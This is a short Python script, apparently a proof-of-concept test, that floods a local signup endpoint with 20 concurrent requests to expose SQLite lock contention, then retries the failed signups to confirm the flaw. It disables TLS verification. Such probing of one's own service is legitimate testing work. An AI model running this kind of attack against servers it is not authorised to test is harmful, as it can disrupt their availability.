# Multi-threaded attack simulation script to induce SQLite3 concurrency contention

import urllib3
import requests
import uuid
import concurrent.futures
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "https://localhost:9090/signup"

def send_signup_request(index):
    unique_username = f"user_{uuid.uuid4().hex[:8]}"
    payload = {
        "username": unique_username,
        "password": "SecurePassword123!"
    }

    try:
        # Send concurrent request to the target server
        response = requests.post(TARGET_URL, data=payload, verify=False, timeout=5)
        return index, unique_username, response.status_code, response.json()
    except Exception as e:
        return index, unique_username, 0, str(e)

if __name__ == "__main__":
    print("[+] Starting SQLite Concurrenty Contention Attack simulation...")
    print(f"[+] Target: {TARGET_URL}")
    print("[+] Sending 20 concurrent requests with unique usernames...")

    start_time = time.time()

    # Using 20 threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        results = list(executor.map(send_signup_request, range(20)))

    end_time = time.time()

    success_count = 0
    fail_count = 0
    error_details = []
    failed_usernames = []   # Collect failed usernames

    for index, unique_username, status, body in results:
        if status == 201:
            success_count += 1
        else:
            fail_count += 1
            error_details.append((status, body))
            failed_usernames.append((index, unique_username))

    print(f"\n[+] Simulation complete in {end_time - start_time:.2f} seconds.")
    print(f"    - Success (201 Created): {success_count}/20")
    print(f"    - Failures (Lock Contention): {fail_count}/20")

    # If failures occur, concurrenty contention vulnerability is verified
    if fail_count > 0:
        print("\n[+] Triggering False-Positive Elimination Algorithm (Re-trying failed requests sequentially)...")
        time.sleep(1)   # Wait for contention end

        proven_vulnerable = False

        for index, unique_username in failed_usernames:
            retry_payload = {
                "username": unique_username,
                "password": "SecurePassword123!"
            }

            retry_resp = requests.post(TARGET_URL, data=retry_payload, verify=False, timeout=5)

            if retry_resp.status_code == 201:
                print(f"    [!] Confirmed: Username '{unique_username}' succeeded on retry. Previous failure was due to DB Lock.")
                proven_vulnerable = True
                break
        
        if proven_vulnerable:
            print("\n[!] Conclusion: Vulnerability CONFIRMED via sequential retry verification!")
        else:
            print("\n[+] Conclusion: No concurrent lock issues proven. Failures were actual duplicates.")

    else:
        print("\n[+] Verification: All requests complete successfully. No lock contention.")
